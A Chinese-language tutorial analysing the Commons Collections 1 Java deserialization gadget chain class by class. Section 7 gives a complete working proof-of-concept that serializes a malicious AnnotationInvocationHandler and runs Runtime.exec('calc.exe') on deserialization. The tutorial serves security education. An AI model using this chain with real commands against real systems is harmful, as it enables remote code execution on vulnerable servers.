## Java安全之CC1链

视频教程:https://www.bilibili.com/video/BV1A1421q7zj?t=86.3

# Java反序列化漏洞之Commons Collections 1 (CC1) 链深度剖析

## 1. CC1链核心原理与攻击流程概览

Commons Collections 1 (CC1) 反序列化漏洞是Java安全史上一个里程碑式的发现，它揭示了如何利用Java标准库和第三方库的组合，在反序列化过程中执行任意代码。该漏洞的核心在于，攻击者可以构造一个恶意的对象序列化流，当目标应用对其进行反序列化时，会触发一系列精心设计的调用链，最终导致远程代码执行（RCE）。CC1链的精妙之处在于，它并非利用某个单一的漏洞点，而是通过多个看似无害的类和方法的组合，形成了一条完整的攻击路径。这条路径的起点是Java反序列化的入口`readObject`方法，终点是`Runtime.exec()`等能够执行系统命令的方法。整个攻击过程利用了Java的反射机制、动态代理以及集合框架的特性，展现了攻击者对于Java语言底层机制的深刻理解。

### 1.1 攻击链触发条件与环境

要成功利用CC1链，目标环境必须满足特定的依赖库版本和JDK版本要求。这些限制条件源于漏洞所利用的特定类和方法在不同版本中的实现差异。

#### 1.1.1 依赖库版本：Commons Collections 3.1 - 3.2.1

CC1链的核心是利用了Apache Commons Collections库中的几个关键类，包括`InvokerTransformer`、`ChainedTransformer`、`ConstantTransformer`和`TransformedMap`。这些类在**3.1至3.2.1版本**中存在可被利用的逻辑 。具体来说，这些版本的`InvokerTransformer`类允许通过其`transform`方法执行任意对象的任意方法，而`ChainedTransformer`则可以将多个`Transformer`串联起来，形成一个复杂的调用链。`TransformedMap`类在`setValue`操作时会调用一个`Transformer`来对值进行转换，这为触发`ChainedTransformer`提供了机会。因此，目标应用必须在其类路径中包含这些特定版本的Commons Collections库 。如果应用使用的是更高版本的库，开发者可能已经修复了这些类的潜在风险，导致攻击链无法成功。

#### 1.1.2 JDK版本限制：JDK 1.7及以下

CC1链的另一个关键组成部分是`sun.reflect.annotation.AnnotationInvocationHandler`类，这是JDK内部的一个类，用于处理注解的动态代理。在**JDK 1.7及更早的版本中**，该类的`readObject`方法在反序列化时，会遍历其内部的`Map`成员变量，并对每个`Map.Entry`调用`setValue`方法。这个`setValue`调用正是触发`TransformedMap`中恶意`Transformer`的关键。然而，从**JDK 8u71开始**，Oracle对`AnnotationInvocationHandler`的`readObject`方法进行了修改，移除了直接调用`setValue`的逻辑，从而切断了这条攻击路径 。因此，CC1链仅适用于JDK 1.7及以下的环境，或者在JDK 8u71之前的版本。这个版本限制是判断目标系统是否易受CC1链攻击的重要依据。

### 1.2 完整的攻击调用链

CC1链的攻击过程可以分解为一系列有序的调用，从反序列化的入口开始，最终执行恶意代码。理解这条调用链的每一个环节，对于深入剖析漏洞原理至关重要。

| 步骤                | 关键类/方法                                 | 作用与描述                                                   |
| :------------------ | :------------------------------------------ | :----------------------------------------------------------- |
| **1. 入口**         | `ObjectInputStream.readObject()`            | Java反序列化的标准入口。攻击者构造的恶意对象通过此方法传入目标应用。 |
| **2. 触发**         | `AnnotationInvocationHandler.readObject()`  | 反序列化时自动调用。该方法会遍历其内部的`Map`对象（`memberValues`），并对每个条目调用`setValue`方法，从而启动攻击链 。 |
| **3. 链式调用**     | `TransformedMap.checkSetValue()`            | `TransformedMap`拦截了`setValue`调用，并触发了其内部预设的`valueTransformer`的`transform`方法，将控制权传递给恶意代码执行链 。 |
| **4. 执行恶意代码** | `ChainedTransformer` & `InvokerTransformer` | `ChainedTransformer`串联多个`Transformer`，`InvokerTransformer`利用反射执行最终命令，如`Runtime.getRuntime().exec()` 。 |

*Table 1: CC1攻击链调用流程概览*

#### 1.2.1 反序列化入口：`ObjectInputStream.readObject()`

攻击的起点是Java的反序列化机制。当应用通过`ObjectInputStream`的`readObject`方法读取一个序列化对象时，Java虚拟机会尝试重建该对象。如果该对象的类实现了`Serializable`接口并重写了`readObject`方法，那么JVM会优先调用这个自定义的`readObject`方法。在CC1链中，攻击者构造的恶意对象是一个`AnnotationInvocationHandler`的实例，该实例内部持有一个被`TransformedMap`装饰的`Map`对象。当这个对象被反序列化时，`AnnotationInvocationHandler`的`readObject`方法会被自动调用，从而启动整个攻击流程 。

#### 1.2.2 触发点：`AnnotationInvocationHandler.readObject()`

`AnnotationInvocationHandler`的`readObject`方法是整个攻击链的触发点。在反序列化过程中，该方法会被调用。其内部逻辑会遍历一个名为`memberValues`的`Map`对象，该对象在构造`AnnotationInvocationHandler`时被传入。在遍历过程中，代码会获取`Map`的`entrySet`，并对每个`Map.Entry`调用`setValue`方法 。攻击者通过精心构造，将`memberValues`设置为一个`TransformedMap`实例。因此，当`readObject`方法调用`setValue`时，实际上是在调用`TransformedMap`内部实现的`setValue`方法，从而将控制权转移到了Commons Collections库中。

#### 1.2.3 链式调用：`TransformedMap.checkSetValue()`

`TransformedMap`是Commons Collections库中的一个装饰器类，它包装了一个标准的`Map`对象，并允许在`put`和`setValue`等操作时，对键或值进行转换。在CC1链中，`TransformedMap`的`checkSetValue`方法扮演了关键角色。当`AnnotationInvocationHandler`的`readObject`方法调用`Map.Entry`的`setValue`时，`TransformedMap`的内部类`MapEntry`的`setValue`方法会被触发。这个方法会调用其父类`AbstractInputCheckedMapDecorator`的`checkSetValue`方法，并将要设置的值作为参数传入 。`checkSetValue`方法内部会调用预先设置好的`valueTransformer`的`transform`方法，从而将攻击链从`TransformedMap`传递到了`ChainedTransformer`。

#### 1.2.4 执行恶意代码：`ChainedTransformer`与`InvokerTransformer`

`ChainedTransformer`是攻击链的核心执行引擎。它内部维护一个`Transformer`数组，其`transform`方法会依次调用数组中每个`Transformer`的`transform`方法，并将前一个`Transformer`的输出作为下一个`Transformer`的输入 。攻击者构造的`ChainedTransformer`数组通常包含一个`ConstantTransformer`和多个`InvokerTransformer`。`ConstantTransformer`的作用是忽略输入参数，直接返回一个预设的常量，例如`Runtime.class`。接下来的`InvokerTransformer`则利用Java的反射机制，依次调用`getMethod`、`invoke`等方法，最终调用`Runtime.getRuntime().exec()`来执行系统命令 。通过这种方式，攻击者将一系列复杂的反射调用封装在一个看似无害的`Transformer`对象中，并通过反序列化过程触发其执行。

## 2. 关键类深度剖析：InvokerTransformer

`InvokerTransformer`是Apache Commons Collections库中的一个核心类，也是CC1链中最终实现代码执行的关键。它实现了`Transformer`接口，其`transform`方法利用Java的反射机制，能够调用任意对象的任意方法。这种强大的功能在正常情况下为开发者提供了便利，但在反序列化漏洞的上下文中，却成为了攻击者执行恶意代码的利器。

### 2.1 核心作用：通过反射调用任意方法

`InvokerTransformer`的核心作用在于其能够通过反射机制，动态地调用一个对象的方法。它的构造函数接收三个参数：要调用的方法名（`methodName`）、方法参数的类型数组（`paramTypes`）以及方法参数的值数组（`args`）。在`transform`方法被调用时，它会获取传入对象的`Class`对象，然后通过`getMethod`方法找到与构造函数中指定的方法名和参数类型相匹配的`Method`对象。最后，通过`invoke`方法，在传入的对象上执行该方法，并传入预设的参数值。这种设计使得`InvokerTransformer`具有极高的灵活性，几乎可以调用任何对象的任何公共方法，这为构造复杂的攻击链提供了可能。

### 2.2 漏洞根源：`transform`方法分析

`InvokerTransformer`的漏洞根源在于其`transform`方法的实现。该方法没有对传入的对象和方法调用进行任何安全检查，完全信任了构造函数中提供的参数。这使得攻击者可以构造一个`InvokerTransformer`实例，指定一个危险的方法（如`Runtime.exec`）和恶意的参数（如要执行的命令），然后将其嵌入到攻击链中。

#### 2.2.1 方法签名与参数

`InvokerTransformer`的构造函数签名如下：
```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)
```
- `methodName`: 一个字符串，指定要调用的方法的名称。
- `paramTypes`: 一个`Class`对象数组，指定方法参数的类型。
- `args`: 一个`Object`对象数组，指定要传递给方法的实际参数值。

这三个参数完全由攻击者在构造`InvokerTransformer`实例时控制，为后续的恶意调用奠定了基础 。

#### 2.2.2 反射调用机制：`getMethod`与`invoke`

`InvokerTransformer`的`transform`方法的核心逻辑如下：
1.  检查输入对象是否为`null`，如果是，则直接返回`null`。
2.  获取输入对象的`Class`对象：`Class cls = input.getClass();`
3.  通过`getMethod`方法，根据`methodName`和`paramTypes`找到对应的`Method`对象：`Method method = cls.getMethod(iMethodName, iParamTypes);`
4.  通过`invoke`方法，在输入对象上调用该方法，并传入`args`作为参数：`return method.invoke(input, iArgs);`

这个过程完全依赖于Java的反射API，使得`InvokerTransformer`能够绕过常规的编译时类型检查，在运行时动态地执行方法调用 。

#### 2.2.3 可控参数带来的风险

由于`InvokerTransformer`的构造函数参数完全可控，攻击者可以构造一个能够执行任意命令的`InvokerTransformer`实例。例如，要执行`calc.exe`命令，可以构造如下`InvokerTransformer`：
```java
InvokerTransformer invokerTransformer = new InvokerTransformer(
    "exec",
    new Class[]{String.class},
    new Object[]{"calc.exe"}
);
```
然后，将这个`invokerTransformer`与一个`Runtime`对象一起使用，调用其`transform`方法，即可弹出计算器。在CC1链中，这个`Runtime`对象是通过`ChainedTransformer`和`ConstantTransformer`动态生成的，从而实现了在反序列化过程中执行任意代码 。

### 2.3 在攻击链中的角色

在CC1链中，`InvokerTransformer`扮演了“最终执行者”的角色。它位于攻击链的末端，负责将前面一系列复杂的调用和对象转换最终转化为一次危险的系统命令执行。

#### 2.3.1 作为恶意代码的最终执行者

整个CC1链的目标是在目标系统上执行任意代码，而`InvokerTransformer`正是实现这一目标的最后一步。通过精心构造的`InvokerTransformer`实例，攻击者可以调用`Runtime.getRuntime().exec()`方法，从而在目标系统上执行任意命令。例如，在ysoserial工具生成的CC1链payload中，通常会看到一系列`InvokerTransformer`被串联起来，依次调用`getMethod`、`invoke`和`exec`，最终完成命令执行 。

#### 2.3.2 与`ChainedTransformer`的协同工作

`InvokerTransformer`本身并不负责生成执行命令所需的对象（如`Runtime`实例），而是依赖于`ChainedTransformer`来提供。`ChainedTransformer`通过链式调用，将`ConstantTransformer`返回的`Runtime.class`对象，经过一系列`InvokerTransformer`的转换，最终变成一个可以执行命令的`Runtime`实例。`InvokerTransformer`与`ChainedTransformer`的协同工作，使得攻击者可以将一个复杂的、多步骤的对象创建和方法调用过程，封装在一个看似无害的`Transformer`对象中，从而绕过安全检查，在反序列化时触发执行 。

## 3. 关键类深度剖析：ChainedTransformer

`ChainedTransformer`是Apache Commons Collections库中另一个关键的类，它在CC1链中扮演了“编排者”和“连接器”的角色。它实现了`Transformer`接口，其核心功能是将多个`Transformer`对象串联起来，形成一个执行链。当一个对象被传递给`ChainedTransformer`的`transform`方法时，它会依次经过链中所有`Transformer`的转换，前一个`Transformer`的输出作为下一个`Transformer`的输入，最终返回最后一个`Transformer`的输出结果。

### 3.1 核心作用：串联多个Transformer

`ChainedTransformer`的核心作用在于将多个独立的`Transformer`组合成一个逻辑上的整体。它的构造函数接收一个`Transformer`数组作为参数，并将其存储在内部的`iTransformers`字段中 。这种设计使得开发者可以将一系列复杂的对象转换操作分解为多个简单的步骤，每个步骤由一个独立的`Transformer`实现，然后通过`ChainedTransformer`将它们串联起来，形成一个可复用的转换逻辑。在CC1链中，攻击者正是利用了这一特性，将`ConstantTransformer`和多个`InvokerTransformer`组合在一起，构建了一个能够动态生成`Runtime`实例并执行命令的复杂攻击链。

### 3.2 实现原理：`transform`方法分析

`ChainedTransformer`的`transform`方法是其实现链式调用的核心。该方法接收一个输入对象，然后遍历内部的`Transformer`数组，依次调用每个`Transformer`的`transform`方法。

#### 3.2.1 链式调用逻辑

`ChainedTransformer`的`transform`方法的源码逻辑大致如下：
```java
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```
这段代码清晰地展示了链式调用的过程。`for`循环遍历`iTransformers`数组，在每次循环中，当前的`object`被传递给`iTransformers[i]`的`transform`方法，然后将返回的结果重新赋值给`object`。这样，在下一轮循环中，下一个`Transformer`接收到的就是上一个`Transformer`处理后的结果 。

#### 3.2.2 前一个Transformer的输出作为后一个的输入

这种“前一个输出作为后一个输入”的机制是`ChainedTransformer`的核心特性，也是CC1链能够成功构建的关键。攻击者可以利用这一机制，将一个复杂的操作分解为多个简单的步骤。例如，在CC1链中，第一个`Transformer`（`ConstantTransformer`）的输出是`Runtime.class`，这个`Class`对象作为输入传递给第二个`Transformer`（一个`InvokerTransformer`），该`InvokerTransformer`调用`getMethod`获取`getRuntime`方法。然后，这个`Method`对象又作为输入传递给第三个`Transformer`，该`Transformer`调用`invoke`方法执行`getRuntime`，从而得到`Runtime`的实例。整个过程环环相扣，每一步的输出都精确地作为下一步的输入，最终完成了从`Runtime.class`到`Runtime`实例的转换 。

### 3.3 在攻击链中的角色

在CC1链中，`ChainedTransformer`扮演了“攻击链构建者”的角色。它将多个独立的、看似无害的`Transformer`组合成一个具有攻击性的整体，并负责在触发时按顺序执行它们。

#### 3.3.1 构建复杂的调用序列

如果没有`ChainedTransformer`，攻击者将很难将多个`InvokerTransformer`的调用串联起来。因为每个`InvokerTransformer`的`transform`方法都需要一个特定的输入对象，而手动管理这些输入输出会非常复杂。`ChainedTransformer`通过其链式调用机制，自动处理了这些中间状态的传递，使得攻击者可以专注于设计每一步的转换逻辑，而无需担心数据如何在步骤之间传递。这使得构建复杂的、多步骤的攻击序列成为可能 。

#### 3.3.2 将`ConstantTransformer`与`InvokerTransformer`组合

`ChainedTransformer`的另一个重要作用是将`ConstantTransformer`和`InvokerTransformer`无缝地组合在一起。`ConstantTransformer`的作用是提供一个固定的初始值（如`Runtime.class`），而`InvokerTransformer`则需要对这个值进行一系列操作。`ChainedTransformer`将这两者连接起来，使得`ConstantTransformer`的输出可以直接作为第一个`InvokerTransformer`的输入，从而启动整个攻击链。这种组合方式是CC1链的经典模式，也是其能够成功绕过安全检查的关键所在 。

## 4. 关键类深度剖析：ConstantTransformer

`ConstantTransformer`是Apache Commons Collections库中一个简单但至关重要的类。它实现了`Transformer`接口，其功能非常直接：无论传入什么对象，其`transform`方法总是返回一个预先设定的常量值。在CC1链中，`ConstantTransformer`扮演了“起点”和“稳定器”的角色，它为整个攻击链提供了一个可控的、固定的初始输入，并解决了`AnnotationInvocationHandler`中`setValue`参数不可控的问题。

### 4.1 核心作用：提供一个固定的常量值

`ConstantTransformer`的核心作用是在一个`Transformer`链中提供一个固定的、不受输入影响的常量值。它的构造函数接收一个`Object`类型的参数，这个参数就是它将始终返回的常量。在`transform`方法被调用时，它会完全忽略传入的`input`参数，直接返回在构造函数中设定的常量 。这种特性使得`ConstantTransformer`在需要引入一个固定对象到转换链中时非常有用。在CC1链中，攻击者利用它来引入`Runtime.class`对象，作为后续反射调用的起点。

### 4.2 实现原理：`transform`方法分析

`ConstantTransformer`的实现原理非常简单，其`transform`方法的源码清晰地展示了其工作方式。

#### 4.2.1 忽略输入参数

`ConstantTransformer`的`transform`方法签名如下：
```java
public Object transform(Object input)
```
然而，在方法体内部，`input`参数被完全忽略了。无论传入什么对象，方法的执行逻辑都不会受到任何影响。这种设计确保了其输出的确定性，即输出只由构造函数中设定的常量决定，与运行时的输入无关。

#### 4.2.2 返回预设的常量对象

`ConstantTransformer`的`transform`方法的核心逻辑就是返回一个预设的常量。在构造函数中，传入的常量被存储在一个名为`iConstant`的私有字段中。`transform`方法直接返回这个字段的值：
```java
public Object transform(Object input) {
    return iConstant;
}
```
这种简单的实现使得`ConstantTransformer`的行为非常可预测，也为攻击者提供了一个可靠的工具，用于在攻击链中注入特定的对象 。

### 4.3 在攻击链中的角色

在CC1链中，`ConstantTransformer`扮演了双重角色：它既是攻击链的“起点”，为后续的反射调用提供了初始对象；又是“稳定器”，解决了`AnnotationInvocationHandler`中`setValue`参数不可控的难题。

#### 4.3.1 为反射调用提供初始对象（如`Runtime.class`）

CC1链的目标是通过反射调用`Runtime.getRuntime().exec()`来执行命令。然而，`Runtime`类没有实现`Serializable`接口，因此不能直接将其实例序列化到payload中。攻击者通过`ConstantTransformer`巧妙地解决了这个问题。他们构造一个`ConstantTransformer`，使其返回`Runtime.class`（`Class`对象是可序列化的）。这个`Class`对象作为`ChainedTransformer`的第一个输入，后续的`InvokerTransformer`就可以通过反射调用其方法，最终动态地创建出`Runtime`的实例 。

#### 4.3.2 作为`ChainedTransformer`的起始点

在`ChainedTransformer`中，`ConstantTransformer`通常作为链的第一个元素。它为整个链式调用提供了一个确定的起点。当`ChainedTransformer`的`transform`方法被调用时，无论传入的初始对象是什么，`ConstantTransformer`都会将其替换为预设的常量（如`Runtime.class`），从而确保后续`InvokerTransformer`的调用能够在一个正确的、可控的对象上进行。这种机制使得攻击链的构建更加灵活和可靠，因为它不依赖于触发时传入的初始参数 。

## 5. 关键类深度剖析：TransformedMap

`TransformedMap`是Apache Commons Collections库中一个功能强大的装饰器类，它扩展了标准Java `Map`的功能。`TransformedMap`允许在对`Map`进行`put`、`putAll`和`Map.Entry`的`setValue`等操作时，对键（key）和值（value）进行自动转换。在CC1链中，`TransformedMap`扮演了“桥梁”和“触发器”的角色，它连接了JDK内部的`AnnotationInvocationHandler`和Commons Collections中的`Transformer`链，使得在反序列化过程中对`Map`的常规操作能够触发恶意的代码执行。

### 5.1 核心作用：在Map操作时触发Transformer

`TransformedMap`的核心作用是在`Map`的特定操作点插入自定义的转换逻辑。它通过装饰一个现有的`Map`实例，并接收两个`Transformer`对象作为参数：一个用于转换键（`keyTransformer`），另一个用于转换值（`valueTransformer`）。当对`TransformedMap`执行`put`操作时，传入的键和值会分别被对应的`Transformer`转换后再存入内部的`Map`。同样，当通过`Map.Entry`的`setValue`方法修改一个已存在的条目时，新的值也会先被`valueTransformer`转换。这种机制为在集合操作中动态地修改数据提供了便利，但在CC1链中，却被攻击者利用来触发恶意的`Transformer`链 。

### 5.2 漏洞触发点：`checkSetValue`方法分析

`TransformedMap`的漏洞触发点在于其`checkSetValue`方法。这个方法在`Map.Entry`的`setValue`操作中被调用，负责对新设置的值进行转换。

#### 5.2.1 方法调用时机：`setValue`操作

`TransformedMap`继承自`AbstractInputCheckedMapDecorator`，后者内部定义了一个`MapEntry`类，该类实现了`Map.Entry`接口。当遍历`TransformedMap`的`entrySet`并调用`setValue`方法时，实际上调用的是`MapEntry`的`setValue`方法。这个方法在将新值存入内部`Map`之前，会先调用其父类`AbstractInputCheckedMapDecorator`的`checkSetValue`方法 。

#### 5.2.2 调用`valueTransformer.transform()`

`checkSetValue`方法的实现非常简单，它接收要设置的新值作为参数，然后调用`TransformedMap`中预设的`valueTransformer`的`transform`方法，并将新值作为参数传入。最后，返回`transform`方法的结果作为最终要存入`Map`的值。
```java
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```
在CC1链中，`valueTransformer`被设置为一个`ChainedTransformer`实例。因此，当`checkSetValue`被调用时，实际上是触发了`ChainedTransformer`的执行，从而启动了整个恶意调用链。

### 5.3 在攻击链中的角色

在CC1链中，`TransformedMap`扮演着“桥梁”的角色，它连接了反序列化的入口点（`AnnotationInvocationHandler`）和恶意代码的执行者（`ChainedTransformer`）。

#### 5.3.1 连接`AnnotationInvocationHandler`与`ChainedTransformer`

`AnnotationInvocationHandler`在反序列化时会遍历其内部的`Map`（即`TransformedMap`），并调用`Map.Entry`的`setValue`方法。`TransformedMap`捕获了这个`setValue`操作，并将其转化为对`ChainedTransformer`的调用。这样，`TransformedMap`就将`AnnotationInvocationHandler`的反序列化行为与`ChainedTransformer`的恶意逻辑巧妙地连接了起来。

#### 5.3.2 作为恶意代码的触发器

`TransformedMap`是整个攻击链的“扳机”。攻击者通过`TransformedMap.decorate`方法，将一个普通的`HashMap`包装成一个`TransformedMap`，并将恶意的`ChainedTransformer`设置为它的`valueTransformer`。当反序列化发生时，`AnnotationInvocationHandler`的遍历行为无意中扣动了这个“扳机”，触发了`TransformedMap`的`checkSetValue`方法，从而引爆了整个攻击链。

## 6. 关键类深度剖析：AnnotationInvocationHandler

`AnnotationInvocationHandler`是CC1链的“大门”或“入口点”。它是一个Java内部类，用于处理注解的动态代理。在CC1链中，它的`readObject`方法被利用来作为整个攻击序列的起点。当包含该对象的序列化数据被反序列化时，`readObject`方法会自动被调用，从而启动后续的攻击流程。

### 6.1 核心作用：利用反序列化触发Map操作

`AnnotationInvocationHandler`的核心作用在于它实现了`Serializable`接口，并且其`readObject`方法在反序列化过程中会执行特定的逻辑。在JDK 8u71之前的版本中，这个逻辑包括对内部一个`Map`类型字段的遍历和修改。攻击者正是利用了这一特性，将一个恶意的`TransformedMap`注入到`AnnotationInvocationHandler`中，使得在反序列化时，`AnnotationInvocationHandler`会“亲手”触发`TransformedMap`的恶意逻辑。

### 6.2 漏洞触发点：`readObject`方法分析

`AnnotationInvocationHandler`的漏洞触发点在于其`readObject`方法的实现。

#### 6.2.1 反序列化过程中的自动调用

在Java反序列化机制中，如果一个类定义了`private void readObject(ObjectInputStream in)`方法，那么在反序列化该类的实例时，`ObjectInputStream`会优先调用这个自定义的`readObject`方法，而不是使用默认的反序列化逻辑。`AnnotationInvocationHandler`就定义了这样一个方法，这为攻击者提供了一个在反序列化过程中执行任意代码的绝佳机会。

#### 6.2.2 对`Map`类型的`memberValues`进行遍历

在`readObject`方法内部，首先会通过`ObjectInputStream`读取对象的状态，包括其内部的`Map`类型的`memberValues`字段。读取完成后，方法会进入一个关键的逻辑块。它会遍历`memberValues`中的所有条目（`Map.Entry`）。这个遍历操作是触发后续攻击的关键一步。在CC1链中，`memberValues`实际上是一个被`TransformedMap`装饰的`Map`，并且其`valueTransformer`被设置为了恶意的`ChainedTransformer`。

#### 6.2.3 调用`Map.Entry`的`setValue`方法

在遍历`memberValues`的条目时，`readObject`方法会检查每个条目的键和值。如果某个条目的值与注解定义中该键对应的默认值不匹配，`readObject`方法就会尝试“修复”这个值。修复的方式就是调用该条目的`setValue`方法，将其设置为一个新的值。这个`setValue`调用正是触发`TransformedMap`漏洞的“扳机”。

### 6.3 在攻击链中的角色

`AnnotationInvocationHandler`在CC1攻击链中扮演着无可替代的“入口点”（Entry Point）角色。它是连接反序列化漏洞和Commons Collections库中恶意类的桥梁。

#### 6.3.1 作为整个攻击链的入口点

整个CC1攻击链的起点是`ObjectInputStream.readObject()`。然而，这个调用本身是中立的，它并不知道将要反序列化的对象是恶意的。`AnnotationInvocationHandler`是第一个在反序列化过程中主动执行自定义逻辑的类。它的`readObject`方法成为了攻击者注入恶意行为的第一个落脚点。攻击者通过构造一个恶意的`AnnotationInvocationHandler`对象，并将其序列化，就可以确保当目标应用反序列化这个对象时，攻击链能够被自动触发，而无需任何额外的用户交互或应用逻辑配合。这种“自包含”的特性使得CC1链非常强大和隐蔽。

#### 6.3.2 将反序列化与`TransformedMap`的触发机制连接起来

`AnnotationInvocationHandler` 的另一个关键作用是它完美地连接了Java的原生反序列化机制和Commons Collections库中的`TransformedMap`触发机制。`TransformedMap`本身需要一个`Map`操作（如`setValue`）来触发其`Transformer`。而`AnnotationInvocationHandler`的`readObject`方法恰好提供了这样一个操作。攻击者利用`AnnotationInvocationHandler`作为“载体”，将恶意的`TransformedMap`“走私”到目标应用的内存中。当反序列化发生时，`AnnotationInvocationHandler`的`readObject`方法就像一个自动引爆装置，它“引爆”了内部的`TransformedMap`，从而启动了后续的攻击链。这种组合利用的方式，充分展示了攻击者对Java语言和第三方库内部机制的深刻理解。

## 7. CC1链攻击实例与代码分析

为了更直观地理解Commons Collections 1 (CC1) 反序列化攻击链的运作机制，本章节将通过一个典型的POC（Proof of Concept）代码，对整个攻击过程进行详细的拆解和分析。我们将从代码的结构入手，逐步解析如何构建恶意的`Transformer`链，如何将其与`TransformedMap`和`AnnotationInvocationHandler`结合，并最终通过序列化与反序列化过程触发漏洞。通过对实例代码的深入剖析，可以清晰地看到各个关键组件是如何协同工作，共同构成一个完整的攻击流程。

### 7.1 POC代码结构解析

一个典型的CC1链POC代码通常包含以下几个核心步骤：构建`Transformer`数组、创建`ChainedTransformer`、装饰`Map`为`TransformedMap`，以及实例化`AnnotationInvocationHandler`。下面我们将结合代码片段，对每个步骤进行详细解释。

#### 7.1.1 构建`Transformer`数组

攻击的第一步是构建一个`Transformer`对象数组。这个数组定义了将要执行的恶意操作序列。在CC1链中，这个序列通常由`ConstantTransformer`和多个`InvokerTransformer`组成，目的是通过反射调用最终执行系统命令。

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
    new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"calc.exe"})
};
```

-   **`new ConstantTransformer(Runtime.class)`**: 这是链条的起点。它负责提供一个稳定的、可控的初始对象`Runtime.class`，为后续的反射调用奠定基础。无论传入什么参数，它的`transform`方法都会返回`Runtime.class` 。
-   **`new InvokerTransformer("getMethod", ...)`**: 这是链条的第一个执行步骤。它通过反射调用`Runtime.class.getMethod("getRuntime", null)`，获取`Runtime`类的`getRuntime`方法对象。
-   **`new InvokerTransformer("invoke", ...)`**: 这是链条的第二个执行步骤。它通过反射调用上一步获取的`Method`对象的`invoke`方法，从而执行`getRuntime()`，返回`Runtime`的单例实例。
-   **`new InvokerTransformer("exec", ...)`**: 这是链条的最后一个执行步骤。它通过反射调用`Runtime`实例的`exec`方法，并传入要执行的命令（如`"calc.exe"`），从而触发最终的恶意行为。

#### 7.1.2 创建`ChainedTransformer`

接下来，将上一步构建的`Transformer`数组包装成一个`ChainedTransformer`对象。`ChainedTransformer`的作用是将数组中的`Transformer`串联起来，形成一个可以按顺序执行的调用链。

```java
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
这个`chainedTransformer`对象就是最终的恶意代码执行引擎。当它的`transform`方法被调用时，它会依次执行数组中的每一个`Transformer`，从而完成从获取`Runtime`类到执行命令的整个过程。

#### 7.1.3 装饰`Map`为`TransformedMap`

现在，需要将`ChainedTransformer`与一个`Map`操作关联起来，以便在`Map`操作时被触发。这里使用`TransformedMap`来完成这个任务。

```java
Map innerMap = new HashMap();
innerMap.put("value", "anything"); // 需要放入一个键值对，以便后续遍历
Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
```
-   首先创建一个普通的`HashMap`实例`innerMap`，并放入一个键值对。这个键值对是必要的，因为`AnnotationInvocationHandler`在反序列化时会遍历这个`Map`。
-   然后，使用`TransformedMap.decorate`方法将`innerMap`包装成一个`TransformedMap`。`decorate`方法的第二个参数是`keyTransformer`，这里设置为`null`，表示不对键进行转换。第三个参数是`valueTransformer`，这里传入我们创建的`chainedTransformer`。这意味着，当`outerMap`中的值被修改时，`chainedTransformer`的`transform`方法就会被调用。

#### 7.1.4 实例化`AnnotationInvocationHandler`

最后一步是创建`AnnotationInvocationHandler`的实例，并将`TransformedMap`作为其内部的`Map`。

```java
Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) ctor.newInstance(Target.class, outerMap);
```
-   由于`AnnotationInvocationHandler`是JDK的内部类，其构造函数不是公开的，因此需要通过反射来获取。
-   `AnnotationInvocationHandler`的构造函数需要两个参数：一个注解的`Class`对象和一个`Map`对象。这里选择`Target.class`作为注解类型，因为它有一个名为`value`的成员，这与我们放入`Map`的键相匹配，可以确保`readObject`方法中的逻辑被触发。
-   将`outerMap`（即`TransformedMap`）作为第二个参数传入。这样，`AnnotationInvocationHandler`内部就持有了我们的恶意`TransformedMap`。

### 7.2 序列化与反序列化过程

#### 7.2.1 序列化恶意对象

创建完`AnnotationInvocationHandler`实例后，需要将其序列化成一个字节数组，以便通过网络发送或保存到文件中。

```java
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(handler);
oos.close();
```
这段代码将`handler`对象（即恶意的`AnnotationInvocationHandler`实例）序列化，并将结果存储在`ByteArrayOutputStream`中。

#### 7.2.2 反序列化触发漏洞

最后，通过反序列化这个字节数组来触发漏洞。

```java
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
Object o = ois.readObject();
```
当`ois.readObject()`被调用时，Java的反序列化机制会重建`AnnotationInvocationHandler`对象。在重建过程中，其`readObject`方法会被自动调用。该方法会遍历其内部的`TransformedMap`，并调用`setValue`方法。这个`setValue`调用会触发`TransformedMap`的`checkSetValue`方法，进而调用`ChainedTransformer`的`transform`方法。`ChainedTransformer`会依次执行其内部的`Transformer`链，最终由`InvokerTransformer`执行`Runtime.getRuntime().exec("calc.exe")`，弹出计算器，从而证明漏洞利用成功。
